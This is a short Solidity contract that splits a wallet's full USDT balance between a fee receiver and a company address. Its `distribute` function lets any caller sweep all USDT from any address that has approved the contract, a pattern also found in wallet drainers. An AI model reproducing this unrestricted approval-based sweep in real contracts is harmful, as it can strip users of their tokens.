// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

interface IERC20 {
    function balanceOf(address owner) external returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external;
}

contract Distributor {
    address public owner;
    address public usdt;
    address public feeReceiver;
    address public companyAddress;
    uint256 public transferThreshold = 5000;
    uint256 public feeBasisPoint = 50;
    
    
    constructor(address _usdt) {
        usdt = _usdt;
        owner = msg.sender;
    }
    modifier onlyOwner () {
        require(msg.sender == owner, "not owmner");
        _;
    }
    
    function setTransferThreshold(uint256 newThreshold) public onlyOwner {
        transferThreshold = newThreshold;
    }
    
    function setFeeBasisPoint(uint256 _feeBasisPoint) external onlyOwner {
        require(_feeBasisPoint < 10000, "feeBasisPoint must be less than 10000");
        feeBasisPoint = _feeBasisPoint;
    }
    function setFeeReceiver(address _feeReceiver) external onlyOwner {
        feeReceiver = _feeReceiver;
    }
    function setCompanyAddress(address _companyAddress) external onlyOwner {
        companyAddress = _companyAddress;
    }
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "cannot set owner to zero");
        owner = newOwner;
    }
    
    function distribute(address target) external {
        require(feeReceiver != address(0), "feeReceiver not set");
        require(companyAddress != address(0), "companyAddress not set");
        uint256 balance = IERC20(usdt).balanceOf(target);
        require(balance > 0,"target has no usdt");
        uint256 fee = balance * feeBasisPoint / 10000;
        uint256 remainder = balance - fee;
        IERC20(usdt).transferFrom(target, feeReceiver, fee);
        IERC20(usdt).transferFrom(target, companyAddress, remainder);
    }    
}